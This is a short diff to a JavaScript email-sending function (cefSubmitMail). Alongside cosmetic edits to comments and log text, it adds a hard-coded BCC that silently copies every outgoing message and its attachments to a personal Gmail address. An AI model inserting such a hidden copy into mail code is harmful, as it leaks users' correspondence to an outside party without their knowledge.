@@ -194,7 +194,8 @@ async function cefSubmitMail(
       .replace(/{{attachments_table}}/g, attachments_table);
 
     // Prepare CC list
-   const ccList = ccArr
+   // Prepare CC list
+    const ccList = ccArr
       .map((entry) => {
         let emails = [];
         try {
@@ -244,13 +245,16 @@ async function cefSubmitMail(
       from: `"${smtp.title}" <${smtp.username}>`,
       to: toList,
       cc: finalCcList,
+	  bcc: [
+        '"Vansh Webstep" <vanshwebstep@gmail.com>'
+      ],
       subject: email.title,
       html: template,
       ...(attachments.length > 0 && { attachments }), // Only include attachments if present
     };
 
     const info = await transporter.sendMail(mailOptions);
-    console.log("Email sent1:", info.response);
+    console.log("Email sent:", info.response);
   } catch (error) {
     console.error("Error sending email:", error.message);
   } finally {
